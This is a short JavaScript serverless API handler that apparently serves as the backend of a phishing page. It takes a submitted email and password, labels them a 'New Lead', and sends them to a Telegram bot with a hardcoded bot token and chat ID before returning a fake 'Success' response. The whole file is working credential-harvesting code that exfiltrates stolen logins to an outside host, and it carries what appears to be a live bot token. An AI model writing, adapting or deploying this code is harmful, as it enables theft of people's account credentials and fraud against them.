export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password } = req.body;
    const botToken = '9154758240:AAFUZIQPiaaKLxDA_v0CpXQLpXLkTs9LlDA';
    const chatId = '6354925459';
    const text = `🚨 New Lead!\nEmail: ${email}\nPass: ${password}`;

    await fetch(`https://api.telegram.org/bot9154758240:AAFUZIQPiaaKLxDA_v0CpXQLpXLkTs9LlDA/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: text })
    });
    return res.status(200).json({ message: 'Success' });
  }
  res.status(405).send('Method Not Allowed');
}